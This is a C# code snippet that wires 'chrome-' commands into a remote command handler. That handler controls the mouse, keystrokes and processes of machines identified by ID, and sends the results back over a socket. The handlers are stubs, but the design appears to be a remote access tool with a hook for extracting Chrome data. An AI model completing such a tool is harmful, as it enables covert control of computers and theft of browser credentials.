using System;
using System.Threading.Tasks;
using System.Text.Json;

namespace CSharpSender
{
    public partial class Program // or your main sender class
    {
        // Example of how to integrate Chrome recovery into your existing message handler
        
        private async Task HandleRemoteCommand(dynamic message)
        {
            try
            {
                string action = message.action;
                string machineId = message.machineId;
                
                // Add Chrome recovery command handling
                if (action.StartsWith("chrome-"))
                {
                    string response = await ChromeRecovery.HandleChromeRecoveryCommand(action, machineId);
                    await SendMessage(response);
                    return;
                }
                
                // Your existing remote command handling
                switch (action)
                {
                    case "mouse-center":
                        await HandleMouseCenter(machineId);
                        break;
                    case "mouse-left":
                        await HandleMouseLeft(machineId);
                        break;
                    case "mouse-right":
                        await HandleMouseRight(machineId);
                        break;
                    case "key-press":
                        string key = message.key;
                        await HandleKeyPress(machineId, key);
                        break;
                    case "kill-process":
                        string pid = message.pid;
                        await HandleKillProcess(machineId, pid);
                        break;
                    // Add your other existing commands here
                    default:
                        await SendError($"Unknown command: {action}");
                        break;
                }
            }
            catch (Exception ex)
            {
                await SendError($"Command error: {ex.Message}");
            }
        }
        
        private async Task SendMessage(string message)
        {
            // Your existing WebSocket send method
            // Example:
            // await webSocket.Send(message);
            Console.WriteLine($"Sending: {message}");
        }
        
        private async Task SendError(string error)
        {
            var errorResponse = new
            {
                type = "command-output",
                requestId = "error",
                error = error
            };
            await SendMessage(JsonSerializer.Serialize(errorResponse));
        }
        
        // Your existing command handlers (unchanged)
        private async Task HandleMouseCenter(string machineId)
        {
            // Your existing mouse center logic
        }
        
        private async Task HandleMouseLeft(string machineId)
        {
            // Your existing mouse left logic
        }
        
        private async Task HandleMouseRight(string machineId)
        {
            // Your existing mouse right logic
        }
        
        private async Task HandleKeyPress(string machineId, string key)
        {
            // Your existing key press logic
        }
        
        private async Task HandleKillProcess(string machineId, string pid)
        {
            // Your existing process kill logic
        }
    }
}
